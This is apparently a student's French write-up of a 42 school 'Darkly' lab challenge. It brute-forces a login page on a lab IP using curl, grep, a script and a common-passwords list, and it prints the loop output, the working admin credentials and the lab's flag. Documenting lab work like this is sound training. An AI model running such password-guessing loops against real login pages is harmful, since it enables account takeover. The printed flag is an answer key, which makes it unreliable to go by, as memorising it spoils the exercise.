# Darkly - École 42

## 14. Brute Force - Login

- Sur la page Login `http://10.12.200.47/?page=signin`

- Quand on tape un username et un password on arrive sur :

`http://10.12.200.47/?page=signin&username=uuuuuuuuuu&password=ppppppppppppppppp&Login=Login#`

- On test:

```
curl -s "http://10.12.200.47/?page=signin&username=uuuuuuuuuu&password=ppppppppppppppppp&Login=Login"
curl -s "http://10.12.200.47/?page=signin&username=uuuuuuuuuu&password=ppppppppppppppppp&Login=Login" | grep -i "wrong"
curl -s "http://10.12.200.47/?page=signin&username=uuuuuuuuuu&password=ppppppppppppppppp&Login=Login" | grep -i "flag"
```

- `grep -i` : insensible a la case.

- Un petit script créé avec l'aide de chatgépétouille :

```
clear; chmod 777 ./14-script-login.sh && ./14-script-login.sh
```

- https://nordpass.com/fr/most-common-passwords-list/

- J'ai dabord essaye avec le username `root` (comme dans le fichier `htpasswd`)

```
...
97 http://10.12.200.47/?page=signin&username=admin&password=98765&Login=Login
98 http://10.12.200.47/?page=signin&username=admin&password=q1w2e3r4&Login=Login
99 http://10.12.200.47/?page=signin&username=admin&password=232323&Login=Login
100 http://10.12.200.47/?page=signin&username=admin&password=102030&Login=Login
101 http://10.12.200.47/?page=signin&username=admin&password=12341234&Login=Login
102 http://10.12.200.47/?page=signin&username=admin&password=147258&Login=Login
103 http://10.12.200.47/?page=signin&username=admin&password=shadow&Login=Login
<center><h2 style="margin-top:50px;">The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 </h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>				</div>
```

- 3min27 pour trouver le bon
